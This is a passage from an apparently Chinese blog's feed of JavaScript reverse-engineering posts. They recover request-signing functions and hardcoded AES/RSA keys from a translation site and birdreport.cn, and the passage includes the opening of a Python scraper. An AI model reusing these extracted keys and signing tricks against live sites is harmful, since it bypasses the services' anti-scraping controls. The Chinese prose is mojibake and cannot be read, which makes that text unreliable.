class="number">12333333333</span>,</span><br><span class="line">    <span class="string">&quot;password&quot;</span>: <span class="string">&quot;123456&quot;</span>,</span><br><span class="line">    <span class="string">&quot;areaCode&quot;</span>: <span class="string">&quot;+86&quot;</span>,</span><br><span class="line">    <span class="string">&quot;inviteId&quot;</span>: <span class="string">&quot;&quot;</span>,</span><br><span class="line">    <span class="string">&quot;deviceType&quot;</span>: <span class="number">0</span>,</span><br><span class="line">    <span class="string">&quot;captchaTicket&quot;</span>: <span class="string">&quot;&quot;</span>,</span><br><span class="line">    <span class="string">&quot;captchaRandstr&quot;</span>: <span class="string">&quot;&quot;</span>,</span><br><span class="line">    <span class="string">&quot;sign_appid&quot;</span>: <span class="string">&quot;h5_23514861&quot;</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">u[<span class="string">&quot;timestamp&quot;</span>] = <span class="built_in">parseInt</span>((<span class="keyword">new</span> <span class="title class_">Date</span>)[<span class="string">&quot;getTime&quot;</span>]() / <span class="number">1e3</span>);</span><br><span class="line"></span><br><span class="line">u[<span class="string">&quot;nonce&quot;</span>] = <span class="string">&quot;&quot;</span> + <span class="title function_">y</span>(<span class="number">5</span>) + <span class="title class_">Math</span>[<span class="string">&quot;floor&quot;</span>](<span class="number">1e7</span> * <span class="title class_">Math</span>[<span class="string">&quot;random&quot;</span>]()) + <span class="title function_">y</span>(<span class="number">5</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> t = <span class="string">&#x27;çœ‹ä½ éº»ç—¹çœ‹&#x27;</span>;</span><br><span class="line"><span class="keyword">let</span> p = <span class="title function_">g</span>(u, t);</span><br><span class="line">u[<span class="string">&quot;sign&quot;</span>] = p[<span class="string">&quot;toLowerCase&quot;</span>]();</span><br><span class="line"></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title class_">JSON</span>.<span class="title function_">stringify</span>(u));</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;å‚è€ƒæ–‡ç« &quot;&gt;&lt;a href=&quot;#å‚è€ƒæ–‡ç« &quot; class=&quot;headerlink&quot; title=&quot;å‚è€ƒæ–‡ç« &quot;&gt;&lt;/a&gt;å‚è€ƒæ–‡ç« &lt;/h1&gt;&lt;p&gt;&lt;a href=&quot;https://www.52pojie.cn/thread-2065436-1-1.html&quot;&gt;https</summary>
      
    
    
    
    <category term="JSé€†å‘" scheme="https://250wuyifan.github.io/categories/JS%E9%80%86%E5%90%91/"/>
    
    
    <category term="JSé€†å‘" scheme="https://250wuyifan.github.io/tags/JS%E9%80%86%E5%90%91/"/>
    
  </entry>
  
  <entry>
    <title>jsé€†å‘-æŸæ˜“æœ‰é“ç¿»è¯‘</title>
    <link href="https://250wuyifan.github.io/2025/10/26/js%E9%80%86%E5%90%91-%E6%9F%90%E6%98%93%E6%9C%89%E9%81%93%E7%BF%BB%E8%AF%91/"/>
    <id>https://250wuyifan.github.io/2025/10/26/js%E9%80%86%E5%90%91-%E6%9F%90%E6%98%93%E6%9C%89%E9%81%93%E7%BF%BB%E8%AF%91/</id>
    <published>2025-10-26T15:55:50.000Z</published>
    <updated>2025-10-26T16:23:34.396Z</updated>
    
    <content type="html"><![CDATA[<p>å®šä½xhr</p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20251027000127964.png" alt="image-20251027000127964"></p><p>è·Ÿè¸ªå †æ ˆæ‰¾åˆ°è¿™é‡Œå‘ç°æ²¡æœ‰signå€¼ï¼Œå¯èƒ½åœ¨è¿™é‡ŒåŠ å¯†ã€‚<img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20251027000255543.png" alt="image-20251027000255543"></p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20251027000400662.png" alt="image-20251027000400662"></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">S</span>(<span class="params">e, t</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_">_</span>(<span class="string">`client=<span class="subst">$&#123;d&#125;</span>&amp;mysticTime=<span class="subst">$&#123;e&#125;</span>&amp;product=<span class="subst">$&#123;u&#125;</span>&amp;key=<span class="subst">$&#123;t&#125;</span>`</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ç„¶åæŠŠéœ€è¦çš„å‚æ•°ç›´æ¥é™æ€å†™å¥½å³å¯</p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20251027001012594.png" alt="image-20251027001012594"></p><p>signå€¼å‡ºæ¥ä¹‹åï¼Œç›´æ¥è§£å¯†å‡½æ•°æœç´¢json.parse</p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20251027001927394.png" alt="image-20251027001927394"></p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20251027002031602.png" alt="image-20251027002031602"></p><p>decodeDataæŒ‡å‘å¦‚ä¸‹ã€‚</p><p>aesè§£å¯†ï¼Œå¯†é’¥å†™æ­»äº†ï¼Œè§£å¯†å³å¯ã€‚</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">O = <span class="function">(<span class="params">e, t, a</span>) =&gt;</span> &#123;</span><br><span class="line">                <span class="keyword">if</span> (!e)</span><br><span class="line">                    <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">                <span class="keyword">const</span> o = l.<span class="title function_">alloc</span>(<span class="number">16</span>, <span class="title function_">T</span>(t))</span><br><span class="line">                  , n = l.<span class="title function_">alloc</span>(<span class="number">16</span>, <span class="title function_">T</span>(a))</span><br><span class="line">                  , r = i.<span class="title function_">createDecipheriv</span>(<span class="string">&quot;aes-128-cbc&quot;</span>, o, n);</span><br><span class="line">                <span class="keyword">let</span> s = r.<span class="title function_">update</span>(e, <span class="string">&quot;base64&quot;</span>, <span class="string">&quot;utf-8&quot;</span>);</span><br><span class="line">                <span class="keyword">return</span> s += r.<span class="title function_">final</span>(<span class="string">&quot;utf-8&quot;</span>),</span><br><span class="line">                s</span><br><span class="line">            &#125;</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20251026235815878.png" alt="image-20251026235815878"></p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20251026235740874.png" alt="image-20251026235740874"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;å®šä½xhr&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20251027000127964.png&quot; alt=&quot;image-202510270</summary>
      
    
    
    
    <category term="JSé€†å‘" scheme="https://250wuyifan.github.io/categories/JS%E9%80%86%E5%90%91/"/>
    
    
    <category term="JSé€†å‘" scheme="https://250wuyifan.github.io/tags/JS%E9%80%86%E5%90%91/"/>
    
  </entry>
  
  <entry>
    <title>jsé€†å‘-æŸå›½è§‚é¸Ÿè®°å½•ä¸­å¿ƒæ´»åŠ¨æŠ¥å‘Š</title>
    <link href="https://250wuyifan.github.io/2025/10/26/js%E9%80%86%E5%90%91-%E6%9F%90%E5%9B%BD%E8%A7%82%E9%B8%9F%E8%AE%B0%E5%BD%95%E4%B8%AD%E5%BF%83%E6%B4%BB%E5%8A%A8%E6%8A%A5%E5%91%8A/"/>
    <id>https://250wuyifan.github.io/2025/10/26/js%E9%80%86%E5%90%91-%E6%9F%90%E5%9B%BD%E8%A7%82%E9%B8%9F%E8%AE%B0%E5%BD%95%E4%B8%AD%E5%BF%83%E6%B4%BB%E5%8A%A8%E6%8A%A5%E5%91%8A/</id>
    <published>2025-10-26T15:49:47.000Z</published>
    <updated>2025-10-26T16:24:53.347Z</updated>
    
    <content type="html"><![CDATA[<p>é¦–å…ˆåˆ†æheaderå¤´éƒ¨çš„signå’ŒrequestIDå¦‚ä½•åŠ å¯†çš„ï¼Œç„¶ååˆ†æå¦‚ä½•å‚æ•°åŠ å¯†ã€‚</p><p>ç„¶åè¿›è¡Œè¿”å›å€¼çš„AESè§£å¯†å³å¯ã€‚</p><p>æ¯”è¾ƒç®€å•é€‚åˆå…¥é—¨å­¦ä¹ ã€‚</p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20251026235459234.png" alt="image-20251026235459234"></p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20251026235233505.png" alt="image-20251026235233505"></p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20251026235224858.png" alt="image-20251026235224858"></p><h1 id="å®Œæ•´ä»£ç å¦‚ä¸‹"><a href="#å®Œæ•´ä»£ç å¦‚ä¸‹" class="headerlink" title="å®Œæ•´ä»£ç å¦‚ä¸‹"></a>å®Œæ•´ä»£ç å¦‚ä¸‹</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br><span class="line">434</span><br><span class="line">435</span><br><span class="line">436</span><br><span class="line">437</span><br><span class="line">438</span><br><span class="line">439</span><br><span class="line">440</span><br><span class="line">441</span><br><span class="line">442</span><br><span class="line">443</span><br><span class="line">444</span><br><span class="line">445</span><br><span class="line">446</span><br><span class="line">447</span><br><span class="line">448</span><br><span class="line">449</span><br><span class="line">450</span><br><span class="line">451</span><br><span class="line">452</span><br><span class="line">453</span><br><span class="line">454</span><br><span class="line">455</span><br><span class="line">456</span><br><span class="line">457</span><br><span class="line">458</span><br><span class="line">459</span><br><span class="line">460</span><br><span class="line">461</span><br><span class="line">462</span><br><span class="line">463</span><br><span class="line">464</span><br><span class="line">465</span><br><span class="line">466</span><br><span class="line">467</span><br><span class="line">468</span><br><span class="line">469</span><br><span class="line">470</span><br><span class="line">471</span><br><span class="line">472</span><br><span class="line">473</span><br><span class="line">474</span><br><span class="line">475</span><br><span class="line">476</span><br><span class="line">477</span><br><span class="line">478</span><br><span class="line">479</span><br><span class="line">480</span><br><span class="line">481</span><br><span class="line">482</span><br><span class="line">483</span><br><span class="line">484</span><br><span class="line">485</span><br><span class="line">486</span><br><span class="line">487</span><br><span class="line">488</span><br><span class="line">489</span><br><span class="line">490</span><br><span class="line">491</span><br><span class="line">492</span><br><span class="line">493</span><br><span class="line">494</span><br><span class="line">495</span><br><span class="line">496</span><br><span class="line">497</span><br><span class="line">498</span><br><span class="line">499</span><br><span class="line">500</span><br><span class="line">501</span><br><span class="line">502</span><br><span class="line">503</span><br><span class="line">504</span><br><span class="line">505</span><br><span class="line">506</span><br><span class="line">507</span><br><span class="line">508</span><br><span class="line">509</span><br><span class="line">510</span><br><span class="line">511</span><br><span class="line">512</span><br><span class="line">513</span><br><span class="line">514</span><br><span class="line">515</span><br><span class="line">516</span><br><span class="line">517</span><br><span class="line">518</span><br><span class="line">519</span><br><span class="line">520</span><br><span class="line">521</span><br><span class="line">522</span><br><span class="line">523</span><br><span class="line">524</span><br><span class="line">525</span><br><span class="line">526</span><br><span class="line">527</span><br><span class="line">528</span><br><span class="line">529</span><br><span class="line">530</span><br><span class="line">531</span><br><span class="line">532</span><br><span class="line">533</span><br><span class="line">534</span><br><span class="line">535</span><br><span class="line">536</span><br><span class="line">537</span><br><span class="line">538</span><br><span class="line">539</span><br><span class="line">540</span><br><span class="line">541</span><br><span class="line">542</span><br><span class="line">543</span><br><span class="line">544</span><br><span class="line">545</span><br><span class="line">546</span><br><span class="line">547</span><br><span class="line">548</span><br><span class="line">549</span><br><span class="line">550</span><br><span class="line">551</span><br><span class="line">552</span><br><span class="line">553</span><br><span class="line">554</span><br><span class="line">555</span><br><span class="line">556</span><br><span class="line">557</span><br><span class="line">558</span><br><span class="line">559</span><br><span class="line">560</span><br><span class="line">561</span><br><span class="line">562</span><br><span class="line">563</span><br><span class="line">564</span><br><span class="line">565</span><br><span class="line">566</span><br><span class="line">567</span><br><span class="line">568</span><br><span class="line">569</span><br><span class="line">570</span><br><span class="line">571</span><br><span class="line">572</span><br><span class="line">573</span><br><span class="line">574</span><br><span class="line">575</span><br><span class="line">576</span><br><span class="line">577</span><br><span class="line">578</span><br><span class="line">579</span><br><span class="line">580</span><br><span class="line">581</span><br><span class="line">582</span><br><span class="line">583</span><br><span class="line">584</span><br><span class="line">585</span><br><span class="line">586</span><br><span class="line">587</span><br><span class="line">588</span><br><span class="line">589</span><br><span class="line">590</span><br><span class="line">591</span><br><span class="line">592</span><br><span class="line">593</span><br><span class="line">594</span><br><span class="line">595</span><br><span class="line">596</span><br><span class="line">597</span><br><span class="line">598</span><br><span class="line">599</span><br><span class="line">600</span><br><span class="line">601</span><br><span class="line">602</span><br><span class="line">603</span><br><span class="line">604</span><br><span class="line">605</span><br><span class="line">606</span><br><span class="line">607</span><br><span class="line">608</span><br><span class="line">609</span><br><span class="line">610</span><br><span class="line">611</span><br><span class="line">612</span><br><span class="line">613</span><br><span class="line">614</span><br><span class="line">615</span><br><span class="line">616</span><br><span class="line">617</span><br><span class="line">618</span><br><span class="line">619</span><br><span class="line">620</span><br><span class="line">621</span><br><span class="line">622</span><br><span class="line">623</span><br><span class="line">624</span><br><span class="line">625</span><br><span class="line">626</span><br><span class="line">627</span><br><span class="line">628</span><br><span class="line">629</span><br><span class="line">630</span><br><span class="line">631</span><br><span class="line">632</span><br><span class="line">633</span><br><span class="line">634</span><br><span class="line">635</span><br><span class="line">636</span><br><span class="line">637</span><br><span class="line">638</span><br><span class="line">639</span><br><span class="line">640</span><br><span class="line">641</span><br><span class="line">642</span><br><span class="line">643</span><br><span class="line">644</span><br><span class="line">645</span><br><span class="line">646</span><br><span class="line">647</span><br><span class="line">648</span><br><span class="line">649</span><br><span class="line">650</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">BirdReport API çˆ¬è™« - å®Œæ•´å®ç°</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">é¡¹ç›®åœ°å€: https://www.birdreport.cn</span></span><br><span class="line"><span class="string">åŠŸèƒ½: è·å–é¸Ÿç±»è§‚å¯Ÿæ´»åŠ¨æ•°æ®</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">================================================================================</span></span><br><span class="line"><span class="string">æŠ€æœ¯è¯¦è§£</span></span><br><span class="line"><span class="string">================================================================================</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">1. è¯·æ±‚åŠ å¯† (RSA)</span></span><br><span class="line"><span class="string">   - ç®—æ³•: RSA PKCS#1 v1.5</span></span><br><span class="line"><span class="string">   - å¯†é’¥é•¿åº¦: 1024ä½</span></span><br><span class="line"><span class="string">   - åˆ†å—å¤§å°: 117å­—èŠ‚/å—</span></span><br><span class="line"><span class="string">   - ç¼–ç : Base64</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">2. ç­¾åç”Ÿæˆ (MD5)</span></span><br><span class="line"><span class="string">   - ç®—æ³•: MD5(data + requestId + timestamp)</span></span><br><span class="line"><span class="string">   - ä½œç”¨: é˜²æ­¢è¯·æ±‚è¢«ç¯¡æ”¹</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">3. å“åº”è§£å¯† (AES)</span></span><br><span class="line"><span class="string">   - ç®—æ³•: AES-256-CBC</span></span><br><span class="line"><span class="string">   - å¯†é’¥: 32å­—èŠ‚ UTF-8 å­—ç¬¦ä¸²</span></span><br><span class="line"><span class="string">   - IV: 16å­—èŠ‚ UTF-8 å­—ç¬¦ä¸²</span></span><br><span class="line"><span class="string">   - å¡«å……: PKCS7</span></span><br><span class="line"><span class="string">   - ç¼–ç : Base64</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">4. å¯†é’¥æ¥æºè¯´æ˜</span></span><br><span class="line"><span class="string">   JavaScript åŸå§‹ä»£ç ä¸­ï¼Œå¯†é’¥ç»è¿‡ä»¥ä¸‹è½¬æ¢:</span></span><br><span class="line"><span class="string">   </span></span><br><span class="line"><span class="string">   æ­¥éª¤1: åŸå§‹å­˜å‚¨ (åå…­è¿›åˆ¶å­—ç¬¦ä¸²)</span></span><br><span class="line"><span class="string">       key_hex = &quot;6756696653534952657053656868665752665050485566485667545454484967&quot;</span></span><br><span class="line"><span class="string">       iv_hex  = &quot;53536868555767547048526949655455&quot;</span></span><br><span class="line"><span class="string">   </span></span><br><span class="line"><span class="string">   æ­¥éª¤2: åå…­è¿›åˆ¶è§£ç </span></span><br><span class="line"><span class="string">       key_str = bytes.fromhex(key_hex).decode()</span></span><br><span class="line"><span class="string">       # â†’ &quot;gVifSSIRepSehhfWRfPPHUfHVgTTTHIg&quot;</span></span><br><span class="line"><span class="string">       iv_str  = bytes.fromhex(iv_hex).decode()</span></span><br><span class="line"><span class="string">       # â†’ &quot;SShhUWgTpHRiIeTU&quot;</span></span><br><span class="line"><span class="string">   </span></span><br><span class="line"><span class="string">   æ­¥éª¤3: getMapping() å‡½æ•°è½¬æ¢ (å…³é”®æ­¥éª¤!)</span></span><br><span class="line"><span class="string">       mapped_key = getMapping(key_str)</span></span><br><span class="line"><span class="string">       # â†’ &quot;C8EB5514AF5ADDB94B2207B08C66601C&quot;</span></span><br><span class="line"><span class="string">       mapped_iv = getMapping(iv_str)</span></span><br><span class="line"><span class="string">       # â†’ &quot;55DD79C6F04E1A67&quot;</span></span><br><span class="line"><span class="string">   </span></span><br><span class="line"><span class="string">   æ­¥éª¤4: CryptoJS è§£æä¸º WordArray</span></span><br><span class="line"><span class="string">       key = CryptoJS.enc.Utf8.parse(mapped_key)</span></span><br><span class="line"><span class="string">       iv  = CryptoJS.enc.Utf8.parse(mapped_iv)</span></span><br><span class="line"><span class="string">   </span></span><br><span class="line"><span class="string">   æ­¥éª¤5: AES è§£å¯†</span></span><br><span class="line"><span class="string">       CryptoJS.AES.decrypt(encrypted, key, &#123;</span></span><br><span class="line"><span class="string">           iv: iv,</span></span><br><span class="line"><span class="string">           mode: CryptoJS.mode.CBC,</span></span><br><span class="line"><span class="string">           padding: CryptoJS.pad.Pkcs7</span></span><br><span class="line"><span class="string">       &#125;)</span></span><br><span class="line"><span class="string">   </span></span><br><span class="line"><span class="string">   Python å®ç°è¯´æ˜:</span></span><br><span class="line"><span class="string">   æˆ‘ä»¬ç›´æ¥ä½¿ç”¨ getMapping() è½¬æ¢åçš„æœ€ç»ˆç»“æœ (æ­¥éª¤3çš„è¾“å‡º)ï¼Œ</span></span><br><span class="line"><span class="string">   è·³è¿‡äº†åŸå§‹å€¼å’Œ getMapping è½¬æ¢æ­¥éª¤ï¼Œå› ä¸ºæœ€ç»ˆç»“æœå·²çŸ¥ä¸”å›ºå®šã€‚</span></span><br><span class="line"><span class="string">   </span></span><br><span class="line"><span class="string">   å¦‚æœéœ€è¦å®Œæ•´è¿˜åŸ JS å®ç°ï¼Œéœ€è¦é€†å‘ getMapping() å‡½æ•°çš„å…·ä½“ç®—æ³•ã€‚</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">================================================================================</span></span><br><span class="line"><span class="string">ä½¿ç”¨ç¤ºä¾‹</span></span><br><span class="line"><span class="string">================================================================================</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">from birdreport_api import BirdReportAPI</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"># åˆ›å»ºAPIå®ä¾‹</span></span><br><span class="line"><span class="string">api = BirdReportAPI()</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"># æœç´¢æ´»åŠ¨ï¼ˆè‡ªåŠ¨å¤„ç†åŠ å¯†å’Œè§£å¯†ï¼‰</span></span><br><span class="line"><span class="string">result = api.search(page=1, limit=20)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">if result and result.get(&#x27;code&#x27;) == 0:</span></span><br><span class="line"><span class="string">    